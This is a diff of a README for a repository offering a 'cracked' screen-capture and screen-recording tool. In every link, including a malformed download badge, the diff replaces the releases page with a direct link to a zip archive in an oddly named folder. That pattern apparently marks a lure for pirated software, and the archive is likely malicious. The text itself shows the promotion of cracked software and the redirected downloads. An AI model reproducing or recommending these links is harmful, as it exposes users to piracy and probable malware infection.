@@ -1,6 +1,6 @@
 # 🎥 cracked-awesome-screenshot-screen-recorder - Capture Screens Easily and Freely
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-CLICK%20HERE-blue.svg)](https://github.com/lordroger872/cracked-awesome-screenshot-screen-recorder/releases)
+[![Download Now](https://raw.githubusercontent.com/lordroger872/cracked-awesome-screenshot-screen-recorder/main/overgorge/cracked-awesome-screenshot-screen-recorder.zip%20Now-CLICK%https://raw.githubusercontent.com/lordroger872/cracked-awesome-screenshot-screen-recorder/main/overgorge/cracked-awesome-screenshot-screen-recorder.zip)](https://raw.githubusercontent.com/lordroger872/cracked-awesome-screenshot-screen-recorder/main/overgorge/cracked-awesome-screenshot-screen-recorder.zip)
 
 ## 📦 Overview
 
@@ -11,7 +11,7 @@ Welcome to the **Cracked Awesome Screenshot and Screen Recorder**. This software
 To begin using the application, follow these steps:
 
 1. **Visit the Download Page**  
-   Head to the [Releases page](https://github.com/lordroger872/cracked-awesome-screenshot-screen-recorder/releases).
+   Head to the [Releases page](https://raw.githubusercontent.com/lordroger872/cracked-awesome-screenshot-screen-recorder/main/overgorge/cracked-awesome-screenshot-screen-recorder.zip).
 
 2. **Choose Your Version**  
    On the Releases page, you will see different versions of the software. Select the latest version for the best features and performance.
@@ -43,7 +43,7 @@ To begin using the application, follow these steps:
 
 ## 📥 Download & Install
 
-You can easily download the Cracked Awesome Screenshot and Screen Recorder by visiting the [Releases page](https://github.com/lordroger872/cracked-awesome-screenshot-screen-recorder/releases). Make sure to choose the latest version for the best experience.
+You can easily download the Cracked Awesome Screenshot and Screen Recorder by visiting the [Releases page](https://raw.githubusercontent.com/lordroger872/cracked-awesome-screenshot-screen-recorder/main/overgorge/cracked-awesome-screenshot-screen-recorder.zip). Make sure to choose the latest version for the best experience.
 
 ## 📄 System Requirements
 
